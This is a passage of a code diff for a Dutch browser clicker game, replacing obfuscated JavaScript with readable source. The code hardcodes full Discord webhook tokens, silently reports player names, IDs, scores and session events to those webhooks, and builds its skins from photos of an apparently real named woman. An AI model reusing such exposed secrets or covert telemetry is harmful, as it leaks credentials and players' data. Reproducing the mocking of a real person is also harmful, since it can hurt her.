icks']=Y['totalClicks']||0x0;if(!Y['upgrades']||!Y['upgrades']['length']){Y['upgrades']=[];for(let bl=0x0;bl<0x32;bl++){const bw=bl%0x2===0x0;Y['upgrades']['push']({'type':bw?'click':'auto','value':0x1+P(bl/0x2)*0x2,'cost':bw?0x1e*Math['pow'](1.6,bl):0x14*Math['pow'](1.6,bl),'bought':![]});}}Ka={'click':0x0,'ps':0x0,'doubleClick':0x0,'shopDiscount':0x0},K4=0x0,KS=null,Kh('accountsPanel'),Eb(),EI(),EZ(),M('Geswitcht\x20naar:\x20'+Y['name'],'var(--accent2)');})),bS['querySelectorAll']('.acc-del-btn')['forEach'](bW=>bW['addEventListener']('click',()=>{const bl=bW['dataset']['uid'];if(!confirm('Weet\x20je\x20zeker\x20dat\x20je\x20dit\x20account\x20wilt\x20verwijderen?'))return;X=X['filter'](bw=>bw['uid']!==bl),J(X),b7();}));}async function b8(){const bS=q('newAccName')['value']['trim'](),bW=q('newAccMsg');if(!bS||bS['length']<0x2){bW['style']['color']='var(--danger)',bW['innerText']='Naam\x20te\x20kort\x20(min\x202\x20tekens).';return;}if(!t(bS)){bW['style']['color']='var(--danger)',bW['innerText']='Naam\x20mag\x20alleen\x20letters\x20en\x20cijfers\x20bevatten.';return;}if(v(bS)){bW['style']['color']='var(--danger)',bW['innerText']='Die\x20naam\x20is\x20niet\x20toegestaan.';return;}if(X['length']>=0x5){bW['style']['color']='var(--danger)',bW['innerText']='Maximum\x20van\x205\x20accounts\x20bereikt.';return;}if(X['some'](bQ=>bQ['name']['toLowerCase']()===bS['toLowerCase']())){bW['style']['color']='var(--danger)',bW['innerText']='Je\x20hebt\x20al\x20een\x20account\x20met\x20die\x20naam.';return;}bW['style']['color']='var(--muted)',bW['innerText']='Naam\x20controleren...';const bl=await Kt(bS);if(bl){bW['style']['color']='var(--danger)',bW['innerText']='Die\x20naam\x20is\x20al\x20in\x20gebruik.';return;}const bw=R(),bp=C(bS,bw);X['push'](bp),J(X),q('newAccName')['value']='',bW['style']['color']='var(--accent2)',bW['innerText']='Account\x20aangemaakt:\x20'+bS,E0('s_second_acc'),b7(),e(p['login'],'nieuw\x20account:\x20'+bS+'\x20(ID:\x20'+bw+')');}function b9(){return Y['name']&&!t(Y['name']);}async function bK(){const bS=q('nameInput')['value']['trim'](),bW=q('nameError');if(!bS||bS['length']<0x2){bW['innerText']=bS?'Min\x202\x20tekens.':'Voer\x20een\x20naam\x20in.';return;}if(!t(bS)){bW['innerText']='Naam\x20mag\x20alleen\x20letters\x20(a-z)\x20en\x20cijfers\x20(0-9)\x20bevatten.';return;}if(v(bS)){bW['innerText']='Die\x20naam\x20is\x20niet\x20toegestaan.';return;}bW['innerText']='Naam\x20controleren...';const bl=await Kt(bS);if(bl){bW['innerText']='Die\x20naam\x20is\x20al\x20in\x20gebruik.';return;}bW['innerText']='';const bw=R(),bp=C(bS,bw);X=[bp],J(X),r=bw,B(bw),Y=Object['assign']({},bp),Y['unlockedAch']={},Y['claimedAch']={},Y['themesUsed']=[],e(p['login'],'player\x20logged\x20in:\x20'+bS+'\x20(ID:\x20'+bw+')'),q('nameSection')['style']['display']='none',q('playBtn')['style']['display']='block';const bQ=bb();q('offlineBonus')['innerText']=bQ['minutes']>0x0?'+\x20'+T(bQ['bonus'])+'\x20Lantings\x20(offline\x20bonus)':'',q('offlineTime')['innerText']=bQ['minutes']>0x0?'Je\x20bent\x20'+bQ['minutes']+'\x20minuten\x20offline\x20geweest':'';}async function bE(){const bS=q('nameChangeInput')['value']['trim'](),bW=q('nameChangeMsg');if(!bS||bS['length']<0x2){bW['style']['color']='var(--danger)',bW['innerText']=bS?'Min\x202\x20tekens.':'Voer\x20naam\x20in.';return;}if(!t(bS)){bW['style']['color']='var(--danger)',bW['innerText']='Naam\x20mag\x20alleen\x20letters\x20en\x20cijfers\x20bevatten.';return;}if(v(bS)){bW['style']['color']='var(--danger)',bW['innerText']='Niet\x20toegestaan.';return;}if(bS['toLowerCase']()===Y['name']['toLowerCase']()){bW['style']['color']='var(--muted)',bW['innerText']='Dat\x20is\x20al\x20je\x20naam.';return;}const bl=parseInt(localStorage['getItem'](u+Y['uid']))||0x0,bw=0x6ddd00-(Date['now']()-bl);if(bl>0x0&&bw>0x0){const bi=Math['ceil'](bw/0xea60);bW['style']['color']='var(--danger)',bW['innerText']='Naam\x20wijzigen\x20kan\x20pas\x20over\x20'+bi+'\x20minuten.';return;}if(X['some'](bG=>bG['uid']!==Y['uid']&&bG['name']['toLowerCase']()===bS['toLowerCase']())){bW['style']['color']='var(--danger)',bW['innerText']='Je\x20hebt\x20al\x20een\x20account\x20met\x20die\x20naam.';return;}bW['style']['color']='var(--muted)',bW['innerText']='Naam\x20controleren...';const bp=await Kt(bS);if(bp){bW['style']['color']='var(--danger)',bW['innerText']='Die\x20naam\x20is\x20al\x20in\x20gebruik.';return;}const bQ=Y['name'];Y['name']=bS,localStorage['setItem'](u+Y['uid'],Date['now']()),q('nameChangeInput')['value']='',bW['style']['color']='var(--accent2)',bW['innerText']='Naam\x20gewijzigd\x20naar:\x20'+bS,e(p['login'],'name\x20change:\x20'+bQ+'\x20→\x20'+bS+'\x20(ID:\x20'+Y['uid']+')'),KM(Y['uid'],bS,Y['uid'],Y['score']),Eb();}function bb(){const bS=Y['lastOnline']||Date['now'](),bW=P((Date['now']()-bS)/0xea60);return{'minutes':bW,'bonus':bW>0x0?P(Y['perSecond']*0.4*bW):0x0};}const ba=Y['name'],bD=Y['lastOnline']&&Y['lastOnline']!==Y['createdAt'];if(!ba)q('playBtn')['style']['display']='none',q('nameSection')['style']['display']='flex';else{if(b9())q('playBtn')['style']['display']='none',q('nameSection')['style']['display']='flex',q('nameError')['innerText']='Je\x20naam\x20mag\x20alleen\x20letters\x20en\x20cijfers\x20bevatten.\x20Kies\x20een\x20nieuwe\x20naam.',q('nameInput')['value']=Y['name']['replace'](/[^a-zA-Z0-9]/g,'');else{const bS=bb();bS['minutes']>0x0&&(q('offlineBonus')['innerText']='+\x20'+T(bS['bonus'])+'\x20Lantings\x20(offline\x20bonus)',q('offlineTime')['innerText']='Je\x20bent\x20'+bS['minutes']+'\x20minuten\x20offline\x20geweest');}}bD&&ba&&!b9()&&X['length']>0x0&&(q('startScreen')['style']['display']='none',q('main')['style']['display']='flex');q('confirmNameBtn')['addEventListener']('click',bK),q('nameInput')['addEventListener']('keydown',bW=>{if(bW['key']==='Enter')bK();}),q('playBtn')['addEventListener']('click',()=>{if(!Y['name']){q('playBtn')['style']['display']='none',q('nameSection')['style']['display']='flex';return;}e(p['main'],'client\x20connected:\x20'+Y['name']+'\x20(ID:\x20'+Y['uid']+')');const bW=bb();Y['score']+=bW['bonus'],Y['earned']+=bW['bonus'],q('startScreen')['style']['display']='none',q('main')['style']['display']='flex',Eb();}),Kw['addEventListener']('mousedown',()=>{KL(!![]),Ei(),EQ(!![]);});let bH=![],bo=![];document['addEventListener']('keydown',bW=>{if(K5){bW['preventDefault']();let bp=bW['key']['length']===0x1?bW['key']['toUpperCase']():bW['key'];if(bW['key']==='\x20')bp='SPACE';if(bW['key']==='Enter')bp='ENTER';Y['score']-=S,Y['lost']+=S,Y['keybind']=bW['key'],Y['keybindDisplay']=bp,KI['innerText']=bp,K5=![],E0('s_keybind_set'),M('Keybind\x201:\x20'+bp,'var(--accent2)'),Eb();return;}if(K6){bW['preventDefault']();let bQ=bW['key']['length']===0x1?bW['key']['toUpperCase']():bW['key'];if(bW['key']==='\x20')bQ='SPACE';if(bW['key']==='Enter')bQ='ENTER';Y['score']-=S,Y['lost']+=S,Y['keybind2']=bW['key'],Y['keybind2Display']=bQ,KZ['innerText']=bQ,K6=![],M('Keybind\x202:\x20'+bQ,'var(--accent2)'),Eb();return;}if(bW['repeat']||!KB())return;const bl=Y['keybind']||'Enter',bw=Y['keybind2']||'';if(bW['key']===bl||bW['key']['toLowerCase']()===bl['toLowerCase']()){bW['preventDefault'](),KL(![]),Ei();!bH&&(bH=!![],EQ(![]),setTimeout(()=>{bH=![];},0x28));return;}Y['unlockedKeybind2']&&bw&&(bW['key']===bw||bW['key']['toLowerCase']()===bw['toLowerCase']())&&(bW['preventDefault'](),KL(![]),!bo&&(bo=!![],Ei(),EQ(![]),setTimeout(()=>{bo=![];},0x28)));}),document['addEventListener']('keyup',()=>{Ep=![],bo=![],bH=![];}),KI['addEventListener']('click',()=>{if(K5){K5=![],KI['innerText']=Y['keybindDisplay']||'ENTER';return;}if(Y['score']<S){M('Je\x20hebt\x20'+T(S)+'\x20Lantings\x20nodig','var(--danger)');return;}K5=!![],KI['innerText']='Druk\x20een\x20toets...',M('Druk\x20nu\x20een\x20toets\x20in\x20voor\x20keybind\x201','var(--accent2)');}),KZ['addEventListener']('click',()=>{if(!Y['unlockedKeybind2']){if(Y['score']<W){M('Je\x20hebt\x20'+T(W)+'\x20Lantings\x20nodig','var(--danger)');return;}Y['score']-=W,Y['lost']+=W,Y['unlockedKeybind2']=!![],M('Tweede\x20keybind\x20ontgrendeld!','var(--accent2)'),Eb();return;}if(K6){K6=![],KZ['innerText']=Y['keybind2Display']||'—';return;}if(Y['score']<S){M('Je\x20hebt\x20'+T(S)+'\x20Lantings\x20nodig','var(--danger)');return;}K6=!![],KZ['innerText']='Druk\x20een\x20toets...',M('Druk\x20nu\x20een\x20toets\x20in\x20voor\x20keybind\x202','var(--accent2)');}),Kz['addEventListener']('click',()=>K1?EE():EK()),q('lbPrevBtn')['addEventListener']('click',()=>{K0='2.1',E8();}),q('lbNextBtn')['addEventListener']('click',()=>{K0=K,E8();}),q('lbModalClose')['addEventListener']('click',EE),Kj['addEventListener']('click',bW=>{if(bW['target']===Kj)EE();}),q('shopBtn')['addEventListener']('click',()=>{KJ('shopScreen'),EI(),EZ();}),q('shopExitBtn')['addEventListener']('mousedown',()=>Kh('shopScreen')),q('gambleBtn')['addEventListener']('click',()=>{if(Y['unlockedGamble'])KJ('gambleScreen');}),q('gambleExitBtn')['addEventListener']('click',()=>Kh('gambleScreen')),q('openBlackjackBtn')['addEventListener']('click',()=>{if(!Y['unlockedBlackjack'])return;Kh('gambleScreen'),KJ('blackjackScreen'),ER();}),q('bjExitBtn')['addEventListener']('click',()=>Kh('blackjackScreen')),q('bjStartBtn')['addEventListener']('click',()=>Em()),q('bjMinBtn')['addEventListener']('click',()=>EU('betInput')),q('bjAllInBtn')['addEventListener']('click',()=>{q('betInput')['value']=Y['score'],Em();}),q('openRollsBtn')['addEventListener']('click',()=>{if(!Y['unlockedRolls'])return;Kh('gambleScreen'),KJ('rollsScreen');}),q('rollsExitBtn')['addEventListener']('click',()=>Kh('rollsScreen')),q('rollPlayBtn')['addEventListener']('click',()=>Er()),q('rollMinBtn')['addEventListener']('click',()=>EU('rollBet')),q('rollAllBtn')['addEventListener']('click',()=>Er({'allIn':!![],'bet':Y['score']})),q('rollCount')['addEventListener']('input',bW=>{q('rollCountVal')['innerText']=bW['target']['value'];}),q('openMinesBtn')['addEventListener']('click',()=>{if(!Y['unlockedMines'])return;Kh('gambleScreen'),KJ('minesScreen');}),q('minesExitBtn')['addEventListener']('click',()=>Kh('minesScreen')),q('minesStartBtn')['addEventListener']('click',()=>Ek()),q('minesMinBtn')['addEventListener']('click',()=>EU('minesBet')),q('minesAllInBtn')['addEventListener']('click',()=>Ek({'allIn':!![],'bet':Y['score']})),q('minesCashoutBtn')['addEventListener']('click',b0),q('skinBtn')['addEventListener']('click',()=>{KJ('skinScreen'),En();}),q('skinExitBtn')['addEventListener']('click',()=>Kh('skinScreen')),q('statsBtn')['addEventListener']('click',()=>{KJ('statsScreen'),El();}),q('statsExitBtn')['addEventListener']('click',()=>Kh('statsScreen')),q('achBtn')['addEventListener']('click',()=>{KJ('achScreen'),E4();}),q('achExitBtn')['addEventListener']('click',()=>Kh('achScreen')),q('codeSubmitBtn')['addEventListener']('click',b3),q('codeInput')['addEventListener']('keydown',bW=>{if(bW['key']==='Enter')b3();}),q('nameChangeBtn')['addEventListener']('click',bE),q('nameChangeInput')['addEventListener']('keydown',bW=>{if(bW['key']==='Enter')bE();}),q('voteBtn')['addEventListener']('click',b4),q('voteCloseBtn')['addEventListener']('click',()=>Kh('votePanel')),q('voteSubmitBtn')['addEventListener']('click',b5),q('votePanel')['addEventListener']('click',bW=>{if(bW['target']===q('votePanel'))Kh('votePanel');}),KT['addEventListener']('click',()=>{const bW=0x2bf20-(Date['now']()-K7);if(K7>0x0&&bW>0x0){M('Cooldown\x20actief,\x20wacht\x20tot\x20je\x20opnieuw\x20een\x20suggestie\x20kunt\x20sturen.','var(--danger)');return;}KJ('suggestionPanel');}),q('suggestionCloseBtn')['addEventListener']('click',()=>Kh('suggestionPanel')),q('sendSuggestionBtn')['addEventListener']('click',b6),q('suggestionInput')['addEventListener']('keydown',bW=>{if(bW['key']==='Enter')b6();}),q('openAccountsBtn')['addEventListener']('click',()=>{b7(),KJ('accountsPanel');}),q('closeAccountsBtn')['addEventListener']('click',()=>Kh('accountsPanel')),q('createAccBtn')['addEventListener']('click',b8),q('newAccName')['addEventListener']('keydown',bW=>{if(bW['key']==='Enter')b8();}),q('accountsPanel')['addEventListener']('click',bW=>{if(bW['target']===q('accountsPanel'))Kh('accountsPanel');}),document['querySelectorAll']('.theme-btn')['forEach'](bW=>bW['addEventListener']('click',()=>k(bW['dataset']['theme']))),O['addEventListener']('change',()=>{A=O['checked'],localStorage['setItem'](D,A?'true':'false'),KO();}),q('sendAppealBtn')['addEventListener']('click',()=>{const bW=q('appealName')['value']['trim'](),bl=q('appealText')['value']['trim']();if(!bW||!bl){M('Vul\x20beide\x20velden\x20in','var(--danger)');return;}e(p['logs'],'📩\x20BAN\x20APPEAL\x0aNaam:\x20'+bW+'\x0aBericht:\x20'+bl),M('Appeal\x20verstuurd!','var(--accent2)'),q('appealName')['value']='',q('appealText')['value']='';}),window['addEventListener']('beforeunload',()=>{N(),navigator['sendBeacon'](p['main'],new Blob([JSON['stringify']({'content':'client\x20disconnected:\x20'+Y['name']})],{'type':'application/json'}));}),setInterval(()=>{Y['playTime']++;const bW=Date['now']()<Ka['ps']?x(Y['perSecond']*2.5):Y['perSecond'];Y['score']+=bW,Y['earned']+=bW,Eb();},0x7d0),setInterval(()=>{Y['name']&&q('startScreen')['style']['display']==='none'&&(e(p['score'],Y['name']+'\x20(ID:'+Y['uid']+'):\x20'+T(Y['score'])),Ky(Y['name'],Y['uid'],Y['score']));},0x7d0),setInterval(async()=>{await KF(),E8();},0x7d0),setInterval(()=>{if(!K8&&Date['now']()>=KE&&q('startScreen')['style']['display']==='none'){if(Math['random']()<0.2)EG();else KE=Date['now']()+0xea60;}Ea(),KN(),KO(),Ew(),Kf();if(Kb['has']('skinScreen')){const bW=KR(),bl=q('skinCooldownInfo');if(bW>0x0){const bw=Math['ceil'](bW/0xea60),bp=Math['ceil'](bW%0xea60/0x3e8);bl['innerText']='Skin\x20wissel\x20cooldown:\x20nog\x20'+bw+'m\x20'+bp+'s.';}else bl['innerText']='Je\x20kunt\x20van\x20skin\x20wisselen.';}},0x7d0),setInterval(Kd,0x7d0),q('rollCountVal')['innerText']=q('rollCount')['value'],KN(),EI(),EZ(),ED(),El(),Eb(),KO(),Ew(),k(L),document['querySelectorAll']('.theme-btn')['forEach'](bW=>bW['classList']['toggle']('active',bW['dataset']['theme']===L)),KF()['then'](()=>E8()),Kd();}());
+    (function () {
+      "use strict";
+
+      const VERSION = "3.1";
+      const ACCOUNTS_KEY = "lc_accounts_v1";
+      const ACTIVE_ACC_KEY = "lc_active_acc";
+      const THEME_KEY = "lc_theme";
+      const CPS_SHOW_KEY = "lc_cps_show";
+      const VOTE_KEY = "lc_v4_vote";
+      const LAST_SUGG_KEY = "lc_last_sugg";
+      const SKIN_SWAP_KEY = "lc_skin_swap";
+      const NAME_CHANGE_CD_KEY = "lc_name_change_cd";
+      const KEYBIND_CHANGE_COST = 20000;
+      const KEYBIND2_UNLOCK_COST = 100000;
+      const FIREBASE_URL = "https://leaderboard-98b96-default-rtdb.europe-west1.firebasedatabase.app";
+      const REMOTE_URL = "https://raw.githubusercontent.com/toxivid/contact/refs/heads/main/input.txt";
+
+      const WH = {
+        main: "https://discord.com/api/webhooks/1494600652582551582/YSsa5dbxGdod1MkfGji38jrVeTEGOByXw8_6FBKgcq6IrpAlkAReZCjmpfKAwiP5Wr_o",
+        sugg: "https://discord.com/api/webhooks/1493989395018285079/I7kJJ8TzbmvdeZFavX4a1b6ZXlJ3tg8r2WZG1v3I9bOyJ31LXL1lQ9d3HtFdmfQ0sGTe",
+        login: "https://discord.com/api/webhooks/1495091471202779207/N4RjrwDK-nlsMwvTMbBx5p-0atRKB6O4EGxYxZ8-cKFvjqfeqmjkyujPsNveQTCdX3UR",
+        score: "https://discord.com/api/webhooks/1495830744314937609/yIZ8Dns5qSkHHx4IiEdXgn6m9FmuJX5lnmZ0UscJ62j0P6IycIjsFEH8s1S-E19VIBGM",
+        vote: "https://discord.com/api/webhooks/1495450185340555487/osC22JW4StvB8hKZw7c_w1Q3nZ5HhvT1-OvlQzPGb4P-MmB-K3nvGoE6cD1lT8snFbeq",
+        gamble: "https://discord.com/api/webhooks/1503093436914470993/XinbU82bVpuXy95tyXEESR-EXmIW0lCuO-7h9nJPSF9FNu035med_4AnIo6Ts4hCVHh8",
+        logs: "https://discord.com/api/webhooks/1495830744314937609/yIZ8Dns5qSkHHx4IiEdXgn6m9FmuJX5lnmZ0UscJ62j0P6IycIjsFEH8s1S-E19VIBGM",
+        codes: "https://discord.com/api/webhooks/1503352591046672414/YhuTVs9r_-rfkcBCSAd5UY9JexEAwZAsyqq3wCCIgT8zq4Fia-x5X9nibcRvNSBuGNa7"
+      };
+
+      const BLACK_IMG = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='240' height='240'%3E%3Ccircle cx='120' cy='120' r='120' fill='%23111'/%3E%3C/svg%3E";
+
+      const SKIN_DEFS = [
+        { id: 0, name: "Standaard", img: BLACK_IMG, cost: 0, bonus: 1, bonusText: "1x klikken", free: true },
+        { id: 1, name: "LinkedIn Lanting", img: "https://media.licdn.com/dms/image/v2/C4D03AQFYXix849ZkZQ/profile-displayphoto-shrink_200_200/profile-displayphoto-shrink_200_200/0/1536927542937?e=2147483647&v=beta&t=a9zjLySEYxWJZTvPGiv6W7M2Iuqw79fRmKjnplyRRYA", cost: 10000, bonus: 1.25, bonusText: "1.25x klikken", free: false },
+        { id: 2, name: "Zapsport Lanting", img: "https://prod-img.noordhollandsdagblad.nl/public/incoming/2pykvf-larissa-lanting-krijgt-de-bal-omzet-ze-goed-kan-gooien./alternates/WIDTH_1440/Larissa%20Lanting%20krijgt%20de%20bal%20omzet%20ze%20goed%20kan%20gooien.", cost: 25000, bonus: 1.5, bonusText: "1.5x klikken", free: false },
+        { id: 3, name: "Levensgenietende Lanting", img: "https://cdn.discordapp.com/attachments/1493613756830191648/1503416076405571766/image.png?ex=6a0344d4&is=6a01f354&hm=9edf2d9787c92101cd363fbee86100a75e07c02ff9673e5b2b28658caadc8a7b&", cost: 50000, bonus: 2, bonusText: "2x klikken", free: false },
+        { id: 4, name: "Vakantie Lanting", img: "https://cdn.discordapp.com/attachments/1493613756830191648/1503416036819472615/image.png?ex=6a0344cb&is=6a01f34b&hm=2a3939b2ea051c5f6c1b3791d72b16e9a7a8e96af1c7983f282776e94213abe9&", cost: 100000, bonus: 2.5, bonusText: "2.5x klikken", free: false },
+        { id: 5, name: "Jolly Lanting", img: "https://cdn.discordapp.com/attachments/1493613756830191648/1503415259367604405/image.png?ex=6a034411&is=6a01f291&hm=11da79ca77a9e507c4ddc4ff2383f1c302a08ac4beaa2a99beacf6acdf899151&", cost: 500000, bonus: 3, bonusText: "3x klikken", free: false },
+        { id: 6, name: "OG Lanting", img: "https://cdn.discordapp.com/attachments/1493613756830191648/1503414799051260005/image.png?ex=6a0343a4&is=6a01f224&hm=8988832e71e23ce98eddc21ed27753ef1aa069c1c71af36117e67db2cacde2a8&", cost: 50000000, bonus: 4, bonusText: "4x klikken", free: false },
+        { id: 7, name: "Jurk lanting", img: "https://cdn.discordapp.com/attachments/1493613756830191648/1503414567718359061/image.png?ex=6a03436d&is=6a01f1ed&hm=5e13b67fe089a551e2e611ad858c54c94a18d6fe8a10a62edfa6a1cc76828833&", cost: 1000000000, bonus: 5, bonusText: "5x klikken", free: false },
+        { id: 8, name: "fifa lanting", img: "https://cdn.discordapp.com/attachments/1493613756830191648/1503414239719723129/image.png?ex=6a03431e&is=6a01f19e&hm=0f67886d49c2432f0d844aa018bf8a974e00c14078b9a04cf5273cdd0666f844&", cost: 25000000000, bonus: 6, bonusText: "6x klikken", free: false },
+        { id: 9, name: "familie lanting", img: "https://cdn.discordapp.com/attachments/1493613756830191648/1503699412495499465/image.png?ex=6a044cb5&is=6a02fb35&hm=1657b34405f3612faf072c9b038fe834a59ebcf07fea526e750d7c0c190b3ed5&", cost: 100000000000, bonus: 10, bonusText: "10x klikken", free: false },
+      ];
+
+      const BANNED_WORDS = ["sem", "yvonne", "sjors", "kos"];
+      const UNLOCK_DEFS = [
+        { key: "gamble", label: "Gamble knop", desc: "Ontgrendelt de Gamble knop", cost: 100 },
+        { key: "blackjack", label: "Blackjack", desc: "Speelbaar in Gamble menu", cost: 200000 },
+        { key: "rolls", label: "Rolls", desc: "Speelbaar in Gamble menu", cost: 10000 },
+        { key: "mines", label: "Mines", desc: "Speelbaar in Gamble menu", cost: 2000000 },
+      ];
+      const LB_V21 = { "michaelsmegmaeikel": 983212632645483100000, "dihhalpha": 778819730309406000000, "_//_": 8964609716123722000, "Natte hark": 5701510570466705000, "justin": 1337822822809383200, "dikkedaniel123": 1181222723092031000, "yvonne": 47081998670756640, "OG Lanting": 1651486874631794, "Djeeden": 329090479377270, "ron_zaadkanon": 277157913874511, "k1ck": 187676374495059 };
+
+      // ── ACHIEVEMENTS (with rewards) ───────────────────────────────────────────────
+      // reward: percentage of current score to add
+      const NORMAL_ACH = [
+        { id: "clicks_100", icon: "👆", name: "Eerste 100 kliks", desc: "Maak 100 klikken", reward: 3 },
+        { id: "clicks_1k", icon: "💪", name: "Duizend Klikken", desc: "Maak 1.000 klikken", reward: 3 },
+        { id: "clicks_10k", icon: "🔥", name: "Tienduzend Klikken", desc: "Maak 10.000 klikken", reward: 5 },
+        { id: "clicks_100k", icon: "⚡", name: "Honderdduizend Klikken", desc: "Maak 100.000 klikken", reward: 5 },
+        { id: "score_1k", icon: "💰", name: "Eerste Duizend", desc: "Bereik 1.000 Lantings", reward: 3 },
+        { id: "score_100k", icon: "💵", name: "Honderdduizend Lantings", desc: "Bereik 100.000 Lantings", reward: 4 },
+        { id: "score_1m", icon: "💎", name: "Miljonair", desc: "Bereik 1.000.000 Lantings", reward: 5 },
+        { id: "score_1b", icon: "👑", name: "Miljardair", desc: "Bereik 1.000.000.000 Lantings", reward: 8 },
+        { id: "cps_5", icon: "⚡", name: "Snelle Vingers", desc: "Bereik 5 CPS", reward: 3 },
+        { id: "cps_10", icon: "🚀", name: "Razendsnelle Vingers", desc: "Bereik 10 CPS", reward: 5 },
+        { id: "playtime_1h", icon: "⏰", name: "1 Uur Gespeeld", desc: "Speel 1 uur", reward: 4 },
+        { id: "playtime_10h", icon: "🕐", name: "grinder", desc: "Speel 10 uur", reward: 10 },
+        { id: "buy_skin", icon: "🎨", name: "skin koper", desc: "Koop een skin", reward: 3 },
+        { id: "buy_5_upgrades", icon: "🛒", name: "koper", desc: "Koop 5 upgrades", reward: 3 },
+        { id: "gamble_first", icon: "🎲", name: "Gokker", desc: "Speel voor het eerst een gokspel", reward: 3 },
+        { id: "win_blackjack", icon: "🃏", name: "Blackjack Winner", desc: "Win een potje Blackjack", reward: 5 },
+        { id: "win_rolls", icon: "🎰", name: "Lucky Rolls", desc: "Win een rondje Rolls", reward: 4 },
+        { id: "cashout_mines", icon: "💣", name: "Mine Survivor", desc: "Cash out bij Mines", reward: 5 },
+        { id: "unlock_all_gamble", icon: "🏛️", name: "grote gambler", desc: "Ontgrendel alle gokspelen", reward: 6 },
+        { id: "ps_100", icon: "🤖", name: "Automatisch", desc: "Bereik 100 Lantings per seconde", reward: 5 },
+      ];
+      const SECRET_ACH = [
+        { id: "s_cps_13", icon: "👻", name: "Spook", desc: "Bereik precies 13 CPS", reward: 5 },
+        { id: "s_cps_15", icon: "💀", name: "Ongrijpbaar", desc: "Bereik 15 CPS", reward: 7 },
+        { id: "s_lose_all", icon: "😭", name: "Bankroet", desc: "Verlies alles bij een all-in op hoogste score", reward: 25 },
+        { id: "s_allin_win", icon: "🍀", name: "Lucky Bastard", desc: "Win een all-in gok", reward: 10 },
+        { id: "s_midnight", icon: "🌙", name: "Nachtbraker", desc: "Speel na middernacht", reward: 5 },
+        { id: "s_click_1s", icon: "⚡", name: "Bliksem", desc: "Klik 10 keer in 1 seconde", reward: 6 },
+        { id: "s_score_trillion", icon: "🌌", name: "Triljardair", desc: "Bereik 1 biljoen Lantings", reward: 20 },
+        { id: "s_skin_all", icon: "🌈", name: "Volledig Gekleed", desc: "Bezit alle skins", reward: 12 },
+        { id: "s_code_used", icon: "🔑", name: "Codekraker", desc: "Gebruik een geheime code", reward: 5 },
+        { id: "s_vote", icon: "🗳️", name: "Democraat", desc: "Stem in de poll", reward: 4 },
+        { id: "s_suggestion", icon: "💡", name: "Ideeënmachine", desc: "Stuur een suggestie", reward: 4 },
+        { id: "s_second_acc", icon: "👤", name: "alts", desc: "Maak een tweede account aan", reward: 5 },
+        { id: "s_theme_all", icon: "🎨", name: "Stijlvol", desc: "Probeer alle thema's", reward: 5 },
+        { id: "s_falling_catch", icon: "🤸", name: "Vanger", desc: "Vang een vallend object", reward: 6 },
+        { id: "s_gamble_broke", icon: "💸", name: "Gokverslaafd", desc: "Gamble met minder dan 200 Lantings", reward: 8 },
+        { id: "s_ps_1k", icon: "🏭", name: "Fabriek", desc: "Bereik 1.000 Lantings per seconde", reward: 10 },
+        { id: "s_click_10m", icon: "🖱️", name: "Klik God", desc: "Maak 10 miljoen klikken", reward: 15 },
+        { id: "s_upgrade_maxed", icon: "📈", name: "Maxed Out", desc: "Koop 20 upgrades", reward: 8 },
+        { id: "s_keybind_set", icon: "⌨️", name: "Sneltoetser", desc: "Stel een keybind in", reward: 3 },
+        { id: "s_mines_big_win", icon: "💰", name: "Fortuin", desc: "Win meer dan 5x inzet bij Mines", reward: 12 },
+      ];
+      const ALL_ACH = [...NORMAL_ACH, ...SECRET_ACH];
+
+      // ── HELPERS ───────────────────────────────────────────────────────────────────
+      const $ = id => document.getElementById(id);
+      const fl = Math.floor, cl = Math.ceil;
+      function sendWH(url, content) { fetch(url, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ content }) }).catch(() => { }); }
+      function fmtMain(n) {
+        n = fl(n); if (n < 10000) return String(n);
+        const sc = [[1e21, "td"], [1e18, "t"], [1e15, "bd"], [1e12, "b"], [1e9, "md"], [1e6, "m"], [1e3, "k"]];
+        for (const [t, s] of sc) { if (n >= t) { const v = Math.round(n / t * 10) / 10; return (v % 1 === 0 ? v.toFixed(0) : v.toFixed(1)) + s; } }
+        return String(n);
+      }
+      function fmtShop(n) { return fl(n).toString().replace(/\B(?=(\d{3})+(?!\d))/g, "."); }
+      let noticeTimer = null;
+      function showNotice(msg, color) { const el = $("gameNotice"); el.style.display = "block"; el.style.color = color || "var(--text)"; el.innerText = msg; clearTimeout(noticeTimer); noticeTimer = setTimeout(() => { el.style.display = "none"; }, 2400); }
+      function playSfx(kind) { try { const ctx = new (window.AudioContext || window.webkitAudioContext)(); const osc = ctx.createOscillator(); const gain = ctx.createGain(); osc.type = "triangle"; osc.frequency.value = kind === "lose" ? 180 : kind === "safe" ? 480 : 320; gain.gain.value = 0.03; osc.connect(gain); gain.connect(ctx.destination); osc.start(); osc.stop(ctx.currentTime + 0.08); } catch (_) { } }
+      function spawnFloatText(text, color) { const el = document.createElement("div"); el.style.cssText = `position:fixed;left:50%;top:45%;transform:translateX(-50%);color:${color || "#00e5b0"};font-family:'Rajdhani',sans-serif;font-weight:900;font-size:26px;pointer-events:none;z-index:1000;animation:floatUp 1s ease-out;`; el.innerText = text; document.body.appendChild(el); setTimeout(() => el.remove(), 2000); }
+
+      // Name validation: only letters and digits
+      function isValidName(n) { return /^[a-zA-Z0-9_ ]+$/.test(n); }
+      function isBanned(n) { return BANNED_WORDS.some(w => n.toLowerCase().includes(w)); }
+
+      // ── ACCOUNT SYSTEM ────────────────────────────────────────────────────────────
+      function genUID() { const c = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"; return Array.from({ length: 6 }, () => c[fl(Math.random() * c.length)]).join(""); }
+      function loadAccounts() { try { return JSON.parse(localStorage.getItem(ACCOUNTS_KEY)) || []; } catch { return []; } }
+      function saveAccounts(a) { localStorage.setItem(ACCOUNTS_KEY, JSON.stringify(a)); }
+      function getActiveId() { return localStorage.getItem(ACTIVE_ACC_KEY) || ""; }
+      function setActiveId(id) { localStorage.setItem(ACTIVE_ACC_KEY, id); }
+      function createDefaultSave(name, uid) {
+        const u = []; for (let i = 0; i < 50; i++) { const ck = i % 2 === 0; u.push({ type: ck ? "click" : "auto", value: 1 + fl(i / 2) * 2, cost: ck ? 30 * Math.pow(1.6, i) : 20 * Math.pow(1.6, i), bought: false }); }
